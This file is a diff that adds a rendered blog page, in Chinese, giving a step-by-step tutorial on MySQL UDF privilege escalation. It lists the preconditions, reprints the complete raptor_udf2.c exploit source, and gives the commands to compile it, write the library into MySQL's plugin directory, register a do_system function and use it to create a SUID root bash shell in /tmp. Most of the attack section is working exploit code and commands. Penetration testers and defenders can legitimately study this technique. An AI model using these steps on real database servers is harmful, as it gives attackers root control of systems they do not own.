@@ -1,0 +1,724 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  mysql_udf提权 | L
+</title>
+<meta name="description" content="少女祈祷中..."/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" /><meta property="og:type" content="website" />
+  <meta property="og:title" content="mysql_udf提权 | L" />
+  <meta
+    property="og:description"
+    content="少女祈祷中..."
+  />
+  <meta property="og:url" content="http://localhost:1313/post/%E6%8F%90%E6%9D%83/mysql_udf%E6%8F%90%E6%9D%83/" />
+  <meta
+    property="og:site_name"
+    content="HELLO WORLD"
+  />
+  <meta property="og:image" content="http://localhost:1313/images/banner.webp" />
+  <meta property="article:author" content="L" />
+  <meta property="article:published_time" content="2024-01-28T17:15:13&#43;00:00" />
+  <meta property="article:modified_time" content="2024-01-28T17:15:13&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="http://localhost:1313/images/banner.webp" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" aria-selected="false" >English</li><li data-value="ja" role="option" aria-selected="false" >日本語</li><li data-value="zh-cn" role="option" class="selected" aria-selected="true" >简体中文</li><li data-value="zh-tw" role="option" aria-selected="false" >繁體中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="mysql_udf提权"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">mysql_udf提权</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          
+          class="sidebar-right"  ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1检查前提条件安装udf插件的前提条件">1.检查前提条件（安装udf插件的前提条件）</a></li>
+    <li><a href="#2安装udf插件">2.安装UDF插件</a></li>
+    <li><a href="#3利用如果mysql已经安装udf插件的情况下可直接使用以下步骤提权">3.利用（如果，mysql已经安装udf插件的情况下，可直接使用以下步骤提权）</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">74</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      15
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">20</div>
+  </a>
+</div>
+<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">友链</div>
+    </div></div></div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-01-28 17:15:13 &#43;0000 UTC" itemprop="datePublished"
+      >2024-01-28</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2024-01-28</time
+    >
+  </span></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="一简介">
+<a class="header-anchor" href="#%e4%b8%80%e7%ae%80%e4%bb%8b"></a>
+一、简介
+</h1><p>​	UDF(用户自定义函数)，是mysql中的一个扩展插件。作用是可以让用户通过自定义函数来实现在MySQL中无法实现的功能。</p>
+<h1 id="二条件">
+<a class="header-anchor" href="#%e4%ba%8c%e6%9d%a1%e4%bb%b6"></a>
+二、条件
+</h1><ul>
+<li>
+<p>需要有mysql账户权限（creat、insert、delete），最好为root。</p>
+</li>
+<li>
+<p>数据库 secure_file_priv参数的值为空，或指定了提权所需的路径，即mysql插件安装路径。（该参数默认值为NULL，所以需要修改才行）</p>
+<p>​	secure_file_priv是用来限制load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。</p>
+<p>​		<strong>当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权 。</strong></p>
+<p>​		<strong>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权 。</strong></p>
+<p>​		<strong>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权。</strong></p>
+</li>
+</ul>
+<h1 id="三步骤">
+<a class="header-anchor" href="#%e4%b8%89%e6%ad%a5%e9%aa%a4"></a>
+三、步骤
+</h1><h2 id="1检查前提条件安装udf插件的前提条件">
+<a class="header-anchor" href="#1%e6%a3%80%e6%9f%a5%e5%89%8d%e6%8f%90%e6%9d%a1%e4%bb%b6%e5%ae%89%e8%a3%85udf%e6%8f%92%e4%bb%b6%e7%9a%84%e5%89%8d%e6%8f%90%e6%9d%a1%e4%bb%b6"></a>
+1.检查前提条件（安装udf插件的前提条件）
+</h2><p>查看当前账号权限。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">substring_index</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="w"> </span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>secure_file_priv值为空</p>
+<p><img src="../../images/image-20231003145844513.png" alt="image-20231003145844513"></p>
+<p>查看插件安装路径</p>
+<p><img src="../../images/image-20231003150054851.png" alt="image-20231003150054851"></p>
+<h2 id="2安装udf插件">
+<a class="header-anchor" href="#2%e5%ae%89%e8%a3%85udf%e6%8f%92%e4%bb%b6"></a>
+2.安装UDF插件
+</h2><p>安装步骤以该文件为例，自行去searchspolit 下载</p>
+<p><img src="../../images/image-20231031223256398.png" alt="image-20231031223256398"></p>
+<p>文件内容如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat 1518.c   
+</span></span><span class="line"><span class="cl">/*
+</span></span><span class="line"><span class="cl"> * <span class="nv">$Id</span>: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * raptor_udf2.c - dynamic library <span class="k">for</span> do_system<span class="o">()</span> MySQL UDF
+</span></span><span class="line"><span class="cl"> * Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2006</span> Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * This is an helper dynamic library <span class="k">for</span> <span class="nb">local</span> privilege escalation through
+</span></span><span class="line"><span class="cl"> * MySQL run with root privileges <span class="o">(</span>very bad idea!<span class="o">)</span>, slightly modified to work
+</span></span><span class="line"><span class="cl"> * with newer versions of the open-source database. Tested on MySQL 4.1.14.
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
+</span></span><span class="line"><span class="cl"> * <span class="k">for</span> the security vulnerabilities in the handling of User Defined Functions
+</span></span><span class="line"><span class="cl"> * <span class="o">(</span>UDFs<span class="o">)</span> reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further
+</span></span><span class="line"><span class="cl"> * details, please refer to:
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
+</span></span><span class="line"><span class="cl"> * http://www.wisec.it/vulns.php?page<span class="o">=</span><span class="m">4</span>
+</span></span><span class="line"><span class="cl"> * http://www.wisec.it/vulns.php?page<span class="o">=</span><span class="m">5</span>
+</span></span><span class="line"><span class="cl"> * http://www.wisec.it/vulns.php?page<span class="o">=</span><span class="m">6</span>
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * <span class="s2">&#34;UDFs should have at least one symbol defined in addition to the xxx symbol
+</span></span></span><span class="line"><span class="cl"><span class="s2"> * that corresponds to the main xxx() function. These auxiliary symbols
+</span></span></span><span class="line"><span class="cl"><span class="s2"> * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and
+</span></span></span><span class="line"><span class="cl"><span class="s2"> * xxx_add() functions&#34;</span>. -- User Defined Functions Security Precautions
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * Usage:
+</span></span><span class="line"><span class="cl"> * $ id
+</span></span><span class="line"><span class="cl"> * <span class="nv">uid</span><span class="o">=</span>500<span class="o">(</span>raptor<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>500<span class="o">(</span>raptor<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>500<span class="o">(</span>raptor<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> * $ gcc -g -c raptor_udf2.c
+</span></span><span class="line"><span class="cl"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</span></span><span class="line"><span class="cl"> * $ mysql -u root -p
+</span></span><span class="line"><span class="cl"> * Enter password:
+</span></span><span class="line"><span class="cl"> * <span class="o">[</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> * mysql&gt; use mysql<span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * mysql&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * mysql&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">&#39;/home/raptor/raptor_udf2.so&#39;</span><span class="o">))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * mysql&gt; <span class="k">select</span> * from foo into dumpfile <span class="s1">&#39;/usr/lib/raptor_udf2.so&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * mysql&gt; create <span class="k">function</span> do_system returns integer soname <span class="s1">&#39;raptor_udf2.so&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * mysql&gt; <span class="k">select</span> * from mysql.func<span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * +-----------+-----+----------------+----------+
+</span></span><span class="line"><span class="cl"> * <span class="p">|</span> name      <span class="p">|</span> ret <span class="p">|</span> dl             <span class="p">|</span> <span class="nb">type</span>     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> * +-----------+-----+----------------+----------+
+</span></span><span class="line"><span class="cl"> * <span class="p">|</span> do_system <span class="p">|</span>   <span class="m">2</span> <span class="p">|</span> raptor_udf2.so <span class="p">|</span> <span class="k">function</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> * +-----------+-----+----------------+----------+
+</span></span><span class="line"><span class="cl"> * mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * mysql&gt; <span class="se">\!</span> sh
+</span></span><span class="line"><span class="cl"> * sh-2.05b$ cat /tmp/out
+</span></span><span class="line"><span class="cl"> * <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>bin<span class="o">)</span>,2<span class="o">(</span>daemon<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> * <span class="o">[</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> */
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdlib.h&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">enum Item_result <span class="o">{</span>STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT<span class="o">}</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">typedef struct st_udf_args <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        unsigned int            arg_count<span class="p">;</span>      // number of arguments
+</span></span><span class="line"><span class="cl">        enum Item_result        *arg_type<span class="p">;</span>      // pointer to item_result
+</span></span><span class="line"><span class="cl">        char                    **args<span class="p">;</span>         // pointer to arguments
+</span></span><span class="line"><span class="cl">        unsigned long           *lengths<span class="p">;</span>       // length of string args
+</span></span><span class="line"><span class="cl">        char                    *maybe_null<span class="p">;</span>    // <span class="m">1</span> <span class="k">for</span> maybe_null args
+</span></span><span class="line"><span class="cl"><span class="o">}</span> UDF_ARGS<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">typedef struct st_udf_init <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        char                    maybe_null<span class="p">;</span>     // <span class="m">1</span> <span class="k">if</span> func can <span class="k">return</span> NULL
+</span></span><span class="line"><span class="cl">        unsigned int            decimals<span class="p">;</span>       // <span class="k">for</span> real functions
+</span></span><span class="line"><span class="cl">        unsigned long           max_length<span class="p">;</span>     // <span class="k">for</span> string functions
+</span></span><span class="line"><span class="cl">        char                    *ptr<span class="p">;</span>           // free ptr <span class="k">for</span> func data
+</span></span><span class="line"><span class="cl">        char                    const_item<span class="p">;</span>     // <span class="m">0</span> <span class="k">if</span> result is constant
+</span></span><span class="line"><span class="cl"><span class="o">}</span> UDF_INIT<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">int do_system<span class="o">(</span>UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span>args-&gt;arg_count !<span class="o">=</span> 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        system<span class="o">(</span>args-&gt;args<span class="o">[</span>0<span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">char do_system_init<span class="o">(</span>UDF_INIT *initid, UDF_ARGS *args, char *message<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// milw0rm.com <span class="o">[</span>2006-02-20<span class="o">]</span>  
+</span></span></code></pre></div><p>首先需要将该C文件上传至目标机器</p>
+<p>依据说明进行操作</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc -g -c 1518.c -fPIC    <span class="c1">#-g 生成调试信息  -c 仅编译，不链接 -fPIC 生成位置无关代码</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#此处完成后，会生成1518.O文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gcc -g -shared -Wl,-soname,&lt;name&gt;.so -o &lt;name&gt;.so 1518.o -lc  <span class="c1">#指定好上一步生成的.o文件，&lt;name&gt;表示可以自由命名 </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#此时生成&lt;name&gt;.so 共享文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#进入数据库中执行</span>
+</span></span><span class="line"><span class="cl">use mysql<span class="p">;</span>
+</span></span><span class="line"><span class="cl">mysql&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>  <span class="c1">#创建包含blob数据类型的表</span>
+</span></span><span class="line"><span class="cl">mysql&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">&#39;[&lt;name&gt;.so文件的路径]&#39;</span><span class="o">))</span><span class="p">;</span> <span class="c1">#将&lt;name&gt;.so 插入表中</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from foo into dumpfile <span class="s1">&#39;/usr/lib/mysql/plugin/&lt;name&gt;.so&#39;</span><span class="p">;</span><span class="c1">#将存入文件转储到插件路径，注意不同版本的mysql插件路径有所区别，这里可以使用   show variables like &#34;%plugin%&#39;;  的方式去查询。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">__________________________________到此处插件已安装完毕,以下是利用_____________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">create <span class="k">function</span> do_system returns integer soname <span class="s1">&#39;&lt;name&gt;.so&#39;</span><span class="p">;</span> <span class="c1">#创建名为do_system的函数</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#可以使用以下命令进行查看创建的函数</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from mysql.func<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;cp /bin/bash  /tmp/rootbash; chmod +xs /tmp/rootbash&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#利用新建函数执行系统命令，命令的意思为 将bash文件复制到/tmp目录下并赋予 ‘执行’和‘suid权限’ </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#退出数据库</span>
+</span></span><span class="line"><span class="cl">/tmp/rootbash -p  <span class="c1">#-p 表示以特权的身份去执行。</span>
+</span></span></code></pre></div><h2 id="3利用如果mysql已经安装udf插件的情况下可直接使用以下步骤提权">
+<a class="header-anchor" href="#3%e5%88%a9%e7%94%a8%e5%a6%82%e6%9e%9cmysql%e5%b7%b2%e7%bb%8f%e5%ae%89%e8%a3%85udf%e6%8f%92%e4%bb%b6%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e5%8f%af%e7%9b%b4%e6%8e%a5%e4%bd%bf%e7%94%a8%e4%bb%a5%e4%b8%8b%e6%ad%a5%e9%aa%a4%e6%8f%90%e6%9d%83"></a>
+3.利用（如果，mysql已经安装udf插件的情况下，可直接使用以下步骤提权）
+</h2><p>查看是否安装udf插件，使用   whereis lib_mysqludf_sys.so</p>
+<p><img src="../../images/image-20231003151131853.png" alt="image-20231003151131853"></p>
